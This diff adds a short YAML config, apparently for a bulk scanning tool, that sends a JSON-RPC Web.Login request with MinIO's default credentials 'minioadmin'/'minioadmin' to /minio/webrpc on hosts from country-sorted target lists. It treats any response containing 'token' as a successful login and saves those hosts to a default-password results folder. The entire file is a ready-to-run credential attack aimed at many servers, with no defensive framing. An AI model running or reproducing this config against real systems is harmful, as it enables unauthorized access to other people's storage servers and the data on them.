@@ -1,0 +1,18 @@
+targetPath: /minio/webrpc
+targetMethod: post
+targetTimeout: 2
+targetProfixs:
+    http: 127.0.0.1:7890
+    https: 127.0.0.1:7890
+targetAllowRedirects: false
+targetHeaders:
+    Content-Type: application/json
+targetJson:
+targetData: '{"id":1,"jsonrpc":"2.0","params":{"username":"minioadmin","password":"minioadmin"},"method":"Web.Login"}'
+targetReExpression:
+    respStatusCode: 200
+    # respHeaders: application/json
+    respBody: 'token'
+targetDir: ../countryQueryResult/
+targetOutputDir: ../2CVE漏洞POC目标/miniol默认密码/
+targetRestText: 2
